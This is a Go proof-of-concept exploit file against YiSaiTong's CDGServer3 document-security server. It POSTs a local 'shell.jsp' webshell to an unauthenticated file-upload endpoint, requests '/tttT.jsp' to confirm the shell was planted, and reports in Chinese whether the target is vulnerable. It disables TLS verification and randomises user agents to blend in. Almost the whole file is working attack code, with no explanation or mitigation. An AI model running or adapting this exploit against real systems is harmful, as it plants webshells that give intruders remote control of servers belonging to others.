package poc

import (
	"bytes"
	"crypto/tls"
	"github.com/fatih/color"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"time"
)

func getRandUa() string {
	UserAgents := []string{"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
		"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
		"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"}
	length := len(UserAgents)
	rand.Seed(time.Now().UnixNano())
	index := rand.Intn(length)
	return UserAgents[index]
}

func YiSaiTong_upload_Exp(target string) {

	payloadUrl := target + "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	shell, err := ioutil.ReadFile("shell.jsp")
	if err != nil {
		log.Println("[-]打开文件失败")
		return
	}
	req, err := http.NewRequest("POST", payloadUrl, bytes.NewBuffer(shell))
	if err != nil {
		color.HiRed("[-]Error creating request")
		return
	}
	req.Header.Add("User-Agent", getRandUa())

	resp, err := client.Do(req)
	if err != nil {
		log.Println("[-]", err)
		return
	}
	defer resp.Body.Close()
	req1, err := http.NewRequest("GET", target+"/tttT.jsp", nil)
	if err != nil {
		log.Println("[-]目标访问失败")
		return
	}
	req1.Header.Add("User-Agent", getRandUa())
	resp2, err := client.Do(req1)
	if err != nil {
		log.Println("[-]", err)
		return
	}
	if resp.StatusCode == http.StatusOK && resp2.StatusCode == http.StatusOK {
		color.Green("[+]存在漏洞,地址%s\n", target+"/tttT.jsp")
	} else {
		color.Red("[-]不存在漏洞,目标:", resp2.StatusCode)
	}
}
